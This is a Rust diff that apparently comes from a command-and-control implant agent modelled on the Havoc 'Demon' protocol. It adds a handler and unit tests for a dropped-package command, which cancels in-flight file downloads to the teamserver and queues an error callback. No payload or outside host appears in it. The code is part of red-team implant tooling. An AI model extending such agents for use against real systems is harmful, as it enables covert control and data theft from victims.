@@ -895,6 +895,9 @@ pub(crate) async fn execute(
                 exit_method,
             });
         }
+        DemonCommand::CommandPackageDropped => {
+            execute_package_dropped(package.request_id, &package.payload, state)?;
+        }
         // Windows-only commands: return explicit not-supported errors.
         command @ (DemonCommand::CommandToken
         | DemonCommand::CommandInlineExecute
@@ -914,6 +917,48 @@ pub(crate) async fn execute(
             });
         }
     }
+
+    Ok(())
+}
+
+/// Handle `CommandPackageDropped` (ID 2570): a previously queued packet was
+/// dropped (e.g. exceeded the SMB pipe buffer limit).
+///
+/// The payload carries two u32 values:
+/// - `dropped_package_length` — size of the dropped package in bytes.
+/// - `max_length` — the maximum allowed buffer size.
+///
+/// Any in-flight download whose `request_id` matches the dropped package is
+/// marked for removal so the agent does not keep trying to send chunks for a
+/// transfer the teamserver will never complete.
+fn execute_package_dropped(
+    request_id: u32,
+    payload: &[u8],
+    state: &mut PhantomState,
+) -> Result<(), PhantomError> {
+    let mut parser = TaskParser::new(payload);
+    let dropped_length = parser.int32()? as u32;
+    let max_length = parser.int32()? as u32;
+
+    tracing::warn!(
+        request_id,
+        dropped_length,
+        max_length,
+        "package dropped — cleaning up in-flight state"
+    );
+
+    // Mark any active download associated with this request as removed so
+    // `push_download_chunks` will close it on the next poll cycle.
+    for download in &mut state.downloads {
+        if download.request_id == request_id {
+            download.state = DownloadTransferState::Remove;
+        }
+    }
+
+    state.queue_callback(PendingCallback::Error {
+        request_id,
+        text: format!("package dropped: size {dropped_length} exceeds max {max_length}"),
+    });
 
     Ok(())
 }
@@ -5826,5 +5871,98 @@ mod tests {
     #[tokio::test]
     async fn windows_only_command_assembly_list_versions_rejected() {
         assert_windows_only_rejected(DemonCommand::CommandAssemblyListVersions).await;
+    }
+
+    // ------------------------------------------------------------------
+    // CommandPackageDropped
+    // ------------------------------------------------------------------
+
+    #[tokio::test]
+    async fn package_dropped_queues_error_callback() {
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&(128_000_i32).to_le_bytes()); // dropped length
+        payload.extend_from_slice(&(65_536_i32).to_le_bytes()); // max length
+        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 42, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute package dropped");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Error { request_id, text } = &callbacks[0] else {
+            panic!("expected Error callback, got: {callbacks:?}");
+        };
+        assert_eq!(*request_id, 42);
+        assert!(text.contains("128000"), "should mention dropped length");
+        assert!(text.contains("65536"), "should mention max length");
+    }
+
+    #[tokio::test]
+    async fn package_dropped_marks_matching_download_for_removal() {
+        let mut state = PhantomState::default();
+
+        // Manually insert an active download with request_id 99.
+        let tmp = std::env::temp_dir().join("phantom_test_pkg_dropped");
+        std::fs::write(&tmp, b"test data").expect("write temp file");
+        let file = std::fs::File::open(&tmp).expect("open temp file");
+        state.downloads.push(super::ActiveDownload {
+            file_id: 1,
+            request_id: 99,
+            file,
+            total_size: 9,
+            read_size: 0,
+            state: DownloadTransferState::Running,
+        });
+
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&(200_000_i32).to_le_bytes());
+        payload.extend_from_slice(&(65_536_i32).to_le_bytes());
+        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);
+
+        execute(&package, &mut state).await.expect("execute");
+
+        assert_eq!(state.downloads[0].state, DownloadTransferState::Remove);
+
+        let _ = std::fs::remove_file(&tmp);
+    }
+
+    #[tokio::test]
+    async fn package_dropped_leaves_unrelated_downloads_intact() {
+        let mut state = PhantomState::default();
+
+        let tmp = std::env::temp_dir().join("phantom_test_pkg_dropped_other");
+        std::fs::write(&tmp, b"other data").expect("write temp file");
+        let file = std::fs::File::open(&tmp).expect("open temp file");
+        state.downloads.push(super::ActiveDownload {
+            file_id: 2,
+            request_id: 50,
+            file,
+            total_size: 10,
+            read_size: 0,
+            state: DownloadTransferState::Running,
+        });
+
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&(200_000_i32).to_le_bytes());
+        payload.extend_from_slice(&(65_536_i32).to_le_bytes());
+        // Different request_id — should not touch the download.
+        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);
+
+        execute(&package, &mut state).await.expect("execute");
+
+        assert_eq!(state.downloads[0].state, DownloadTransferState::Running);
+
+        let _ = std::fs::remove_file(&tmp);
+    }
+
+    #[tokio::test]
+    async fn package_dropped_with_short_payload_returns_parse_error() {
+        // Only one u32 instead of two.
+        let payload = (128_000_i32).to_le_bytes().to_vec();
+        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 1, payload);
+        let mut state = PhantomState::default();
+
+        let result = execute(&package, &mut state).await;
+        assert!(result.is_err());
     }
 }
